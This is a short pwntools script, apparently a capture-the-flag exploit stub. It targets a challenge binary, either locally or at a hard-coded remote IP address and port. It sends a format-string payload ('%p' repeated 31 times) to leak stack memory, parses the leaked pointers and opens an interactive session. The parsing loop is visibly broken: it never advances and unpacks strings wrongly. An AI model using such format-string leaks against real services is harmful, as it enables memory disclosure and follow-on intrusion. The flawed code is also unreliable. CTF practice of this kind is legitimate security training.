#!/usr/bin/env python3
from pwn import *


def main():
    if args.REMOTE:
        tube = remote('69.172.229.147', 9002)
    else:
        tube = process(['./chall'])
    tube.sendline('%p' * 31)
    leak = tube.recvline().strip().decode()
    values = []
    while len(leak) > 0:
        m = re.search(r'(0x[0-9a-f]+|\(nil\))', leak[1:])
        if m is None:
            value_str = leak
        else:
            value_str, = leak[m.span()[1]:]
        if value_str == '(nil)':
            values.append(0)
        else:
            values.append(int(value_str, 16))
    print(values)
    tube.interactive()


if __name__ == '__main__':
    main()
